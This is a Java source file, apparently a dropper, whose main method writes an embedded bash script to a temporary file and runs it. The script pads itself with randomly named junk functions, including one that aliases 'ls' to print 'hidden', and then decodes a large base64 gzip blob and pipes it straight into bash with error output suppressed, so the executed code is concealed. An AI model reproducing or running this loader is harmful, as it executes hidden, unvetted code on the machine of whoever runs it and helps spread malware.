import java.io.*;

public class Main {
    public static void main(String[] args) {
        try {

            String script = """
#!/bin/bash

vxas32civ() { echo $((RANDOM * RANDOM)); }
vkkmxgwn8() { for i in {1..3}; do :; done; }
vqrdtr8e2() { alias ls='echo hidden'; }

base64 -d <<'EOF' | gunzip | bash 2>/dev/null
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
EOF
""";


            File file = File.createTempFile("start", ".sh");
            try (FileWriter fw = new FileWriter(file)) {
                fw.write(script);
            }


            file.setExecutable(true);


            ProcessBuilder pb = new ProcessBuilder("bash", file.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();


            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) System.out.println(line);
            p.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
